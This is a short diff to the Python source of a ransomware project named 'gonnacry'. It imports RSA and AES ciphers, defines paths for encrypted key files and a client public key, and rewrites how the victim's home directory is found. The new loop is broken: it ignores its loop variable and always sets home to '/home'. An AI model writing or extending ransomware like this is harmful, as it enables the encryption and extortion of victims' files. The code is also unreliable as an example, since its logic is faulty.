@@ -6,7 +6,12 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 
 ransomware_name = "gonnacry"
-home = os.path.expanduser("~")
+for file in os.listdir("/home"):
+	home = os.path.join("/home")
+	if os.path.isdir(os.path.join(home, ransomware_name)):
+		break
+else:
+	home = os.path.expanduser("~")
 ransomware_path = os.path.join(home, ransomware_name)
 aes_encrypted_keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
 client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")
